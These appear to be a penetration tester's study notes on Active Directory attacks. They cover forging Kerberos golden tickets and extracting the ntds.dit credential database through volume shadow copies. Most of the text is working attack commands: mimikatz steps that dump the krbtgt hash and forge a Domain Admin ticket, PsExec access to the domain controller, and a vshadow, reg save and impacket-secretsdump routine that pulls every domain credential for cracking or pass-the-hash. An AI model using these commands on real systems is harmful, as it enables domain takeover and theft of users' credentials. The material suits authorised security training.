## GOLDEN TICKETS:
The secret key that encrypts TGT is password hash of krbtgt user. If we obtain that we can forge our own custom tickets called GOLDEN TICKETS.

We can forge a TGT stating non-privileged user is a Domain Admin user and DC will trust because its encrypted correctly. Thus our non- privileged user will become Domain Admin.

```
PsExec64.exe \\DC1cmd.exe (Access should be denied)  
Login to DC using domain administrator creds and run mimikatz 
lsadump::lsa /patch
```

Take note of SID and ntlm hash of krbtgt Steps after this you can try on any machine

• kerberos::purge(BeforecreatingGoldenTicketletsdeleteexistingkerberosticket)

kerberos::golden/user:jen/domain:corp.com/sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt (any valid user in domain that we have access, User ID 500 for Built-In Administrator for domain)

misc::cmd
    
PsExec.exe\\dc1cmd.exe(usehostname.ipwillthrowerror)
    
whoami/groups
    
## SHADOW COPIES:
    
Known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes. We can extract ntds.dit file and copy that to kali and extract every user credential offline from kali

```
vshadow.exe -nw -p C:  
Note the path in Shadow copy device name:  
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak (first path is above point path)
reg.exe save hklm\system c:\system.bak  
File transfer both files to kali  
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL 
We can crack or do PTH
```
